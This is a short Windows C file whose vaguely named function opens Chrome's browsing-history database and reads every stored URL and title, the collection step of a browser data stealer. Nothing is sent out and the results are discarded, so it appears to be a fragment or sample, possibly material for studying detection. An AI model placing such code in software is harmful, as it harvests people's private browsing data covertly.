#include <windows.h>
#include <wincrypt.h>

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
int sqlite3_open(const char *, sqlite3 **);
int sqlite3_prepare_v2(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);
int sqlite3_step(sqlite3_stmt *);
const unsigned char *sqlite3_column_text(sqlite3_stmt *, int);
int sqlite3_finalize(sqlite3_stmt *);
int sqlite3_close(sqlite3 *);

void __attribute__((noinline)) __attribute__((used)) routine_v2()
{
    char b[260];
    char *p = b;
    char *s = "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History";
    while (*s)
        *p++ = *s++;
    *p = 0;
    sqlite3 *d = 0;
    sqlite3_open(b, &d);
    sqlite3_stmt *q = 0;
    sqlite3_prepare_v2(d, "SELECT url, title FROM urls", -1, &q, 0);
    while (sqlite3_step(q) == 100)
    {
        const unsigned char *u = sqlite3_column_text(q, 0);
        const unsigned char *t = sqlite3_column_text(q, 1);
    }
    sqlite3_finalize(q);
    sqlite3_close(d);
}